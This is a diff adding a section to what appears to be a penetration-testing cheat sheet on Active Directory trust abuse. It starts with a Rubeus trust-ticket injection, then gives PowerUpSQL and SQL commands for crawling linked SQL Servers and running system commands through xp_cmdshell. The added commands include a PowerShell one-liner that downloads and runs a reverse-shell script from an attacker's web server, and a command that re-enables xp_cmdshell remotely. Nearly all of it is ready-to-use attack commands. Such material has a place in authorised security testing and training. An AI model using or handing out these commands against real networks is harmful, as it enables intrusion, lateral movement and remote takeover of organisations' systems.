@@ -722,3 +722,32 @@ SID History won't work over a forest trust due to SID filtering.
 Use Rubeus to inject a Trust ticket with Mimikatz as above, into a TGS request across a Forest trust and access a CIFS shared service
 `.\Rubeus.exe asktgs /ticket:<path\to\trust_ticket.kirbi> /service:cifs/<otherdomaindc.domain.com> /dc:<otherdomaindc> /ptt`
 `ls \\otherdomaindc.domain.com\share`
+
+### Trust Abuse with MSSQL
+#### Using PowerUpSQL
+github.com/NetSPI/PowerUpSQL
+ - Enumerate SQL Servers by SPN Scanning
+`Get-SQLInstanceDomain`
+ - Check Accessibility
+`Get-SQLConnectionTestThreaded`
+ - Combine the two
+`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded`
+ - Get Server Information to see if we have access (look for "IsSysAdmin" or other interesting privileges)
+`Get-SQLInstanceDomain | Get-SQLServerInfo`
+ - Using something like HeidiSQL (portable), login and look for database links to other servers
+`select * from master..sysservers`
+ - Enumerate further links from there
+`select * from openquery("<nextSQLserver>",'select * from master..sysservers')`
+ - and continue along the links
+`select * from openquery("<nextSQLserver>",'select * from openquery("<nextSQLserver2>",''select * from master..sysservers'')')`
+ - PowerUpSQL can enumerate the links also
+`Get-SQLServerLink -Instance <target-SQL>`
+ - Automatically crawl SQL Server Links
+`Get-SQLServerLinkCrawl -Instance <target-sql>`
+ - Where xp_cmdshell or RPC is enabled, execute commands within the CustomQuery field
+`Get-SQLServerLinkCrawl -Instance <target-sql>  -Query "exec master..xp_cmdshell 'whoami'`
+`Get-SQLServerLinkCrawl -Instance <target-sql> -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://<webserver>/Invoke-PowerShellTcp.ps1'')"'`
+ - Or manually
+`select * from openquery("<target-sql1>",'select * from openquery("<target-sql2>",''select * from openquery("<target-sql3>",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`
+ - If xp_cmdshell is disabled, but rpcout is enabled you can then enable xp_cmdshell
+`EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "<target-sql>"`
